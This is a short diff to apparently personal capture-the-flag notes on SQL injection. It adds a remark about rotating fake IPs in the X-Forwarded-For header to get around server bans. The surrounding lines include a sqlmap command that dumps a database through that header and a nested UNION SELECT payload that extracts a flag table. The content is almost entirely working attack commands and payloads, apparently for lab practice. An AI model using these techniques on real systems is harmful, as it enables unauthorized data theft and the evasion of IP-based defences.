@@ -51,5 +51,6 @@ SQL injection through HTTP header
 sqlmap -u "http://10.10.245.154/" --headers="X-forwarded-for:1*" -dump
 
 e.g Http header X-forwarded-for is changing the REAL IP to fake ip ----> X-forwarded-for: 133.22.189.45 (fake IP)
+--headers="X-forwarded-for:1* (If server bans 1 IP address, we can use numerous fake IP to enumerate data from server)
 
 10.10.67.27/user?id=1 and 1=2 union all select '1 union all select 1,flag,3,4 from flag-- -',2,3 from sqhell_4.users limit 0,1-- -
